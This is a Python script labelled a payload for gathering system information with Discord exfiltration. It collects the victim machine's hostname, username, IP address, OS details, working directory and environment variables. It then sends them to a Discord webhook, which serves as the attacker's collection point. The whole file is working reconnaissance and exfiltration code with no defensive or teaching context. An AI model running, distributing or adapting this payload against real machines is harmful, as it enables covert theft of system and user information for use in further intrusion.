#!/usr/bin/env python3
"""
System Information Gathering Payload with Discord Exfiltration
"""

import platform
import socket
import os
import sys
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def gather_system_info():
    """Gather comprehensive system information"""
    info = {}
    
    # Basic system info
    info['System'] = platform.system()
    info['Release'] = platform.release()
    info['Version'] = platform.version()
    info['Machine'] = platform.machine()
    info['Processor'] = platform.processor()
    info['Hostname'] = socket.gethostname()
    info['Username'] = os.getlogin()
    info['Current Directory'] = os.getcwd()
    
    # Network info
    try:
        info['IP Address'] = socket.gethostbyname(socket.gethostname())
    except:
        info['IP Address'] = 'N/A'
    
    # Environment variables
    env_vars = {}
    for key in ['USERNAME', 'COMPUTERNAME', 'USERDOMAIN', 'USERPROFILE', 'TEMP']:
        env_vars[key] = os.environ.get(key, 'N/A')
    info['Environment'] = str(env_vars)
    
    return info

def main():
    print("=" * 60)
    print("SYSTEM INFORMATION PAYLOAD")
    print("=" * 60)
    
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    system_info = gather_system_info()
    
    # Display locally
    print("\nSystem Information:")
    for key, value in system_info.items():
        if key != 'Environment':
            print(f"  {key}: {value}")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\nSending to Discord webhook...")
        
        # Format for Discord
        discord_data = {
            "🖥️ System": system_info.get('System', 'Unknown'),
            "📍 Hostname": system_info.get('Hostname', 'Unknown'),
            "👤 Username": system_info.get('Username', 'Unknown'),
            "🌐 IP Address": system_info.get('IP Address', 'Unknown'),
            "💻 Processor": system_info.get('Processor', 'Unknown')[:100],
            "📂 Working Dir": system_info.get('Current Directory', 'Unknown'),
            "⏰ Timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        success = send_to_discord("System Information Collected", discord_data)
        
        if success:
            print("✓ Data sent to Discord successfully!")
        else:
            print("✗ Failed to send to Discord")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
